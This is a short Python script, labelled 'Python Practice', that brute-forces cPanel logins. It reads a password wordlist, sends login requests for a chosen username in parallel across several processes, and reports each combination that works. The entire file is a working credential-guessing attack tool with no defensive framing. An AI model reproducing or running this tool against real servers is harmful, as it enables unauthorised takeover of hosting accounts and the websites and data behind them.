from colorama import *
import requests
import sys
from multiprocessing import Pool

init(autoreset=True)


def banner():
    print(Fore.CYAN + r"""
 _____          _     _     _     _             _  _    ___ _____ 
|  ___|__  _ __| |__ (_) __| | __| | ___ _ __  | || |  / _ \___ / 
| |_ / _ \| '__| '_ \| |/ _` |/ _` |/ _ \ '_ \ | || |_| | | ||_ \ 
|  _| (_) | |  | |_) | | (_| | (_| |  __/ | | ||__   _| |_| |__) |
|_|  \___/|_|  |_.__/|_|\__,_|\__,_|\___|_| |_|___|_|  \___/____/ 
                                             |_____|              
    """)
    print(Fore.YELLOW + "cPanel Brute Force Script - Python Practice\n")


if len(sys.argv) != 5:
    print("Usage: python3 main.py <URL> <USERNAME> <WORDLIST> <THREADS>")
    sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]
user_input = int(sys.argv[4])


def bf(password):
    data = {
        "user": username,
        "pass": password,
        "goto_uri": "/"
    }
    req = requests.post(url + '/login/?login_only=1', data=data)
    if '"status":1,' in req.text:
        print(Fore.LIGHTGREEN_EX + f"[+] Login Successful -> {username}:{password}")
    else:
        print(Fore.RED + f"[-] Login Failed -> {username}:{password}")


banner()


with open(wordlist, "r", encoding="latin-1") as f:
    passwords = [line.strip() for line in f]

pool = Pool(processes=user_input)
pool.map(bf, passwords)
pool.close()
pool.join()
